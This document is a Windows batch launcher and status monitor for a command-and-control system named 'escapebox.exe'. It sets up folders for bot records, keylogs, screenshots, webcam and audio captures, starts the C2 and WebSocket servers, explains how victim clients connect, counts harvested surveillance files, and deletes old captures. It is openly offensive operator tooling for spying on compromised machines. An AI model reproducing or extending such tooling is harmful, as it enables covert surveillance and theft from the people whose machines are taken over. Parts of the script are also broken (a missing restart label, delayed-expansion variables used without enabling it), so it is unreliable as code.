@echo off
echo ================================================================
echo        C2 REAL DATA SYSTEM - NO FAKE DATA STARTUP
echo ================================================================
echo.
echo Starting C2 system with 100% real data collection...
echo All surveillance, analytics, and operations use actual system data
echo.

REM Check administrator privileges
net session >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Running without administrator privileges
    echo Some surveillance features may be limited
    echo.
    choice /C YN /M "Continue without admin privileges"
    if errorlevel 2 exit /b 1
)

REM Create necessary directories for real data
echo [*] Creating real data directories...
mkdir "C:\Windows\Temp\C2_Bots" 2>nul
mkdir "C:\Windows\Temp\C2_Screenshots" 2>nul
mkdir "C:\Windows\Temp\C2_Keylogs" 2>nul
mkdir "C:\Windows\Temp\C2_CommandQueue" 2>nul
mkdir "C:\Windows\Temp\C2_Webcam" 2>nul
mkdir "C:\Windows\Temp\C2_Audio" 2>nul
mkdir "C:\Windows\Temp\C2_Streams" 2>nul
mkdir "C:\Windows\Temp\C2_Uploads" 2>nul
mkdir "C:\Windows\Temp\C2_Downloads" 2>nul
mkdir "C:\Windows\Temp\C2_SystemMonitor" 2>nul

REM Check Python and required packages
echo [*] Checking Python environment for real data modules...
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python is not installed or not in PATH
    echo Please install Python 3.7+ for real data analytics
    pause
    exit /b 1
)

REM Check and install required Python packages for real data
echo [*] Installing required Python packages for real data collection...
pip install psutil websockets asyncio >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Some Python packages may not have installed correctly
    echo Real data features may be limited
)

REM Check if real data modules exist
echo [*] Checking real data modules...
if not exist "c2_real_data_analytics.py" (
    echo [WARNING] Real data analytics module not found
    echo Some analytics features will use fallback mode
)

if not exist "c2_real_file_operations.py" (
    echo [WARNING] Real file operations module not found
    echo File transfer features will use basic mode
)

REM Start the main C2 server
echo [*] Starting main C2 server...
start "C2 Real Data Server" cmd /c "escapebox.exe server && echo. && echo C2 server has stopped. && pause"
timeout /t 3 /nobreak >nul

REM Start the real data WebSocket server
echo [*] Starting real data WebSocket server...
if exist "c2_websocket_server_real_data.py" (
    start "Real Data WebSocket Server" cmd /c "python c2_websocket_server_real_data.py && pause"
) else (
    echo [WARNING] Real data WebSocket server not found, trying enhanced server...
    if exist "c2_enhanced_websocket_server.py" (
        start "Enhanced WebSocket Server" cmd /c "python c2_enhanced_websocket_server.py && pause"
    ) else (
        echo [ERROR] No WebSocket server found
        pause
        exit /b 1
    )
)

timeout /t 3 /nobreak >nul

REM Open the real data dashboard
echo [*] Opening real data dashboard...
if exist "c2_dashboard_enhanced_analytics.html" (
    start "" "http://localhost:8080/c2_dashboard_enhanced_analytics.html"
) else (
    echo [WARNING] Enhanced dashboard not found
    start "" "http://localhost:8080"
)

echo.
echo ================================================================
echo        C2 REAL DATA SYSTEM STARTED SUCCESSFULLY
echo ================================================================
echo.
echo Dashboard: http://localhost:8080/c2_dashboard_enhanced_analytics.html
echo WebSocket: ws://localhost:8081 (Real Data)
echo C2 Server: Port 443/8443
echo.
echo REAL DATA FEATURES:
echo  ✓ Actual system metrics and performance data
echo  ✓ Real file system operations and transfers
echo  ✓ Live desktop streaming with actual capture
echo  ✓ Real webcam and microphone surveillance
echo  ✓ Authentic client data and statistics
echo  ✓ True network and process monitoring
echo.
echo To connect clients, use:
echo   escapebox.exe client [server_ip] [port]
echo   start_enhanced_client.bat [server_ip]
echo.

REM System monitoring loop
:monitor_loop
cls
echo ================================================================
echo        C2 REAL DATA SYSTEM - LIVE STATUS
echo ================================================================
echo Current Time: %date% %time%
echo.

REM Check process status
tasklist /FI "IMAGENAME eq escapebox.exe" 2>nul | find /I "escapebox.exe" >nul
if errorlevel 1 (
    echo [OFFLINE] C2 Server - Not Running
    set C2_STATUS=OFFLINE
) else (
    echo [ONLINE]  C2 Server - Running
    set C2_STATUS=ONLINE
)

tasklist /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq Real Data*" 2>nul | find /I "python.exe" >nul
if errorlevel 1 (
    echo [OFFLINE] Real Data WebSocket Server - Not Running
    set WS_STATUS=OFFLINE
) else (
    echo [ONLINE]  Real Data WebSocket Server - Running
    set WS_STATUS=ONLINE
)

REM Check web server response
powershell -Command "try { $response = Invoke-WebRequest -Uri 'http://localhost:8080' -TimeoutSec 2; exit 0 } catch { exit 1 }" >nul 2>&1
if errorlevel 1 (
    echo [OFFLINE] Web Dashboard - Not Responding
    set WEB_STATUS=OFFLINE
) else (
    echo [ONLINE]  Web Dashboard - Accessible
    set WEB_STATUS=ONLINE
)

echo.
echo REAL CLIENT CONNECTIONS:
if exist "C:\Windows\Temp\C2_Bots\*.json" (
    set CLIENT_COUNT=0
    for %%f in ("C:\Windows\Temp\C2_Bots\*.json") do (
        set /a CLIENT_COUNT+=1
        echo     Client: %%~nf
    )
    echo Total Connected: !CLIENT_COUNT!
) else (
    echo     No clients currently connected
    set CLIENT_COUNT=0
)

echo.
echo REAL SURVEILLANCE DATA:
if exist "C:\Windows\Temp\C2_Screenshots\*.*" (
    for /f %%i in ('dir "C:\Windows\Temp\C2_Screenshots" /b 2^>nul ^| find /c /v ""') do set SCREENSHOT_COUNT=%%i
    echo     Screenshots: !SCREENSHOT_COUNT! files
) else (
    set SCREENSHOT_COUNT=0
    echo     Screenshots: 0 files
)

if exist "C:\Windows\Temp\C2_Keylogs\*.*" (
    for /f %%i in ('dir "C:\Windows\Temp\C2_Keylogs" /b 2^>nul ^| find /c /v ""') do set KEYLOG_COUNT=%%i
    echo     Keylogs: !KEYLOG_COUNT! files
) else (
    set KEYLOG_COUNT=0
    echo     Keylogs: 0 files
)

if exist "C:\Windows\Temp\C2_Webcam\*.*" (
    for /f %%i in ('dir "C:\Windows\Temp\C2_Webcam" /b 2^>nul ^| find /c /v ""') do set WEBCAM_COUNT=%%i
    echo     Webcam Images: !WEBCAM_COUNT! files
) else (
    set WEBCAM_COUNT=0
    echo     Webcam Images: 0 files
)

echo.
echo SYSTEM PERFORMANCE (Real-Time):
REM Get real CPU and memory usage
for /f "skip=1" %%p in ('wmic cpu get loadpercentage /value ^| findstr "="') do set %%p
echo     CPU Usage: %LoadPercentage%%%

for /f "skip=1" %%m in ('wmic OS get TotalVisibleMemorySize^,FreePhysicalMemory /value ^| findstr "="') do set %%m
set /a MEMORY_USED_PERCENT=(TotalVisibleMemorySize-FreePhysicalMemory)*100/TotalVisibleMemorySize 2>nul
echo     Memory Usage: %MEMORY_USED_PERCENT%%%

for /f "tokens=3" %%d in ('dir C:\ /-c ^| findstr "bytes free"') do set FREE_SPACE=%%d
echo     Disk C: Free Space: %FREE_SPACE% bytes

echo.
echo REAL DATA ANALYTICS:
echo     Total Clients Connected: !CLIENT_COUNT!
echo     Data Collection Files: !SCREENSHOT_COUNT! + !KEYLOG_COUNT! + !WEBCAM_COUNT!
if exist "C:\Windows\Temp\c2_analytics.db" (
    echo     Analytics Database: Available
) else (
    echo     Analytics Database: Not Created Yet
)

echo.
echo ================================================================
echo Commands:
echo   R - Restart System    S - Stop System      D - Dashboard
echo   L - View Logs        C - Clean Old Data    Q - Quit Monitor
echo ================================================================
echo.

choice /C RSDLCQ /N /T 10 /D Q /M "Select option (auto-quit in 10s): "
if errorlevel 6 goto :end
if errorlevel 5 goto :clean_data
if errorlevel 4 goto :view_logs
if errorlevel 3 goto :open_dashboard
if errorlevel 2 goto :stop_system
if errorlevel 1 goto :restart_system

:restart_system
echo [*] Restarting real data system...
call :stop_system
timeout /t 3 /nobreak >nul
goto :start

:stop_system
echo [*] Stopping C2 Real Data System...
echo     Terminating C2 server...
taskkill /F /IM escapebox.exe >nul 2>&1
echo     Terminating WebSocket servers...
taskkill /F /IM python.exe >nul 2>&1
echo     System stopped
timeout /t 2 /nobreak >nul
goto :end

:open_dashboard
echo [*] Opening real data dashboard...
start "" "http://localhost:8080/c2_dashboard_enhanced_analytics.html"
goto :monitor_loop

:view_logs
cls
echo ================================================================
echo                    REAL DATA SYSTEM LOGS
echo ================================================================
echo.

if exist "C:\Windows\Temp\c2_activity.log" (
    echo === Recent Activity Log ===
    type "C:\Windows\Temp\c2_activity.log" | more
    echo.
) else (
    echo No activity log found
)

if exist "C:\temp\c2_server_detailed.log" (
    echo === Server Detailed Log ===
    type "C:\temp\c2_server_detailed.log" | more
    echo.
) else (
    echo No server log found
)

echo.
pause
goto :monitor_loop

:clean_data
echo [*] Cleaning old surveillance data...
choice /C YN /M "Delete old screenshots, keylogs, and audio files"
if errorlevel 2 goto :monitor_loop

REM Clean files older than 24 hours
forfiles /P "C:\Windows\Temp\C2_Screenshots" /S /C "cmd /c del @path" /D -1 2>nul
forfiles /P "C:\Windows\Temp\C2_Keylogs" /S /C "cmd /c del @path" /D -1 2>nul
forfiles /P "C:\Windows\Temp\C2_Webcam" /S /C "cmd /c del @path" /D -1 2>nul
forfiles /P "C:\Windows\Temp\C2_Audio" /S /C "cmd /c del @path" /D -1 2>nul
forfiles /P "C:\Windows\Temp\C2_Streams" /S /C "cmd /c del @path" /D -1 2>nul

echo [*] Old data cleaned
timeout /t 2 /nobreak >nul
goto :monitor_loop

:end
echo.
echo ================================================================
echo      C2 Real Data System monitoring ended
echo      
echo      All data collected was from real system operations
echo      No fake or simulated data was used
echo ================================================================
echo.
pause